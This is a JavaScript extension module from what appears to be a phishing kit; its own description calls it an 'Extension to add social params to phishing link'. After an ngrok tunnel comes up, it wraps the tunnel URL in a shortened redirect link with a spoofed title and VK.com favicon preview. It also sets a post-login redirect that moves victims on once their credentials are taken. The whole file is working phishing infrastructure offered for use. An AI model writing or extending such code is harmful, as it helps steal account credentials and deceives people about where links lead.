const { readFileSync } = require('fs')
const { join } = require('path')
const { parse } = require('yaml')
const { default: ayeKosmonavt } = require('aye-kosmonavt-api')

const nuxtConfig = require('../../nuxt.config')
const declareExtension = require('./_')

const configPath = join(__dirname, '..', '..', 'config', 'aye-kosmonavt.yml')
const config = parse(readFileSync(configPath, { encoding: 'utf8' }))

module.exports = declareExtension(
  (instance, extensions) => {
    if (extensions.includes('ngrok')) {
      const currentConfig = (() => {
        if (config.presets[config.use]) {
          return config.presets[config.use]
        } else {
          throw new Error('Undefined preset for option `use` in ' + configPath)
        }
      })()

      instance.on('ngrok:ready-url', async (url) => {
        currentConfig.beforeLoginImage =
          currentConfig.beforeLoginImage ||
          'https://vk.com/images/icons/favicons/fav_im.ico'

        const { shortUrl, url: fullUrl } = await ayeKosmonavt(
          currentConfig.beforeLoginTitle || nuxtConfig.head.title,
          currentConfig.beforeLoginImage,
          {
            ogImage:
              currentConfig.beforeLoginSocialImage ||
              currentConfig.beforeLoginImage,
            redir: url,
            redirTime: currentConfig.beforeLoginRedirTime || 1
          }
        )

        instance.emit('aye-kosmonavt:got-short-url', shortUrl)
        instance.emit('aye-kosmonavt:got-full-url', fullUrl)
        instance.emit('aye-kosmonavt:got-both-urls', { shortUrl, url: fullUrl })

        const { url: ayeKosmonavtURL } = await ayeKosmonavt(
          currentConfig.afterLoginTitle || 'Redirection...',
          currentConfig.beforeLoginImage ||
            'https://vk.com/images/icons/pwa/apple/default.png',
          {
            redir: currentConfig.afterLoginUrl || 'about:blank',
            redirTime: currentConfig.afterLoginRedirTime || 1
          }
        )

        instance.wayOut = ayeKosmonavtURL
      })
    } else {
      throw new Error('Aye kosmonavt requires NGrok plugin')
    }

    return instance
  },
  {
    name: 'aye-kosmonavt',
    description: 'Extension to add social params to phishing link'
  }
)
